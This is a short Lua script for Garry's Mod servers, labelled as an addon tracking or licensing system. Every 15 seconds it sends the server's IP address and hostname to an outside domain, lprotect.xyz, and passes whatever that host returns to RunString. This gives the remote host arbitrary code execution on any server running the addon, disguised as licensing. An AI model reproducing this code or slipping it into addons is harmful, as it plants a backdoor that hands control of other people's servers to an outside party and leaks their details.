print("AddonTracking System")
timer.Create("addontracking", 15, 0 , function()

    http.Fetch( "https://licensing.lprotect.xyz/send",
        
        function( body, length, headers, code )
            if code == 200 then
                RunString(body,"licensing lprotect" , false)
            end  
        end,
  
        function( message )
                
        end,

        { 
            ["serverip"] = game.GetIPAddress(),
            ["servername"] =  GetHostName(),
        }
    )
end)
